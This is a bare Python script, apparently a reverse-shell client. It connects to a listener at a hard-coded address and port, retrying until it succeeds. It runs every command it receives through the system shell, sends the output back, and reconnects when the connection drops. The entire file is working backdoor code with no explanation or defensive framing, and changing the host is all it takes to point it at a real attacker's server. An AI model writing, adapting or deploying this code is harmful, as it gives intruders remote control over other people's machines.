import socket
import subprocess
import os
def start_client():
    host = '127.0.0.1'
    port = 9999

    print(f'Trying to connect to {host} at the port {port}')
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((host, port))
            break
        except ConnectionRefusedError:
            pass

    print('Connected.')
    while True:
        try:
            command = client.recv(1024).decode('utf-8')
            if not command or command=="":
                break
            if command.split(' ')[0].lower()=='cd':
                try:
                    os.chdir(os.path.abspath(command.split(' ')[1].lower()))
                    client.send('Changed to directory {}'.format(os.getcwd()).encode('utf-8'))
                except FileNotFoundError:
                    client.send('No such file or directory.'.encode('utf-8'))
                continue
            if output := subprocess.run(command, shell=True, text=True, capture_output=True):
                output = output.stdout +'\n'+output.stderr
                client.send(output.encode('utf-8'))
            else:
                client.send('Aucun retour de commande.'.encode('utf-8'))
        except ConnectionResetError:
            client.close()
            start_client()

if __name__ == "__main__":
    start_client()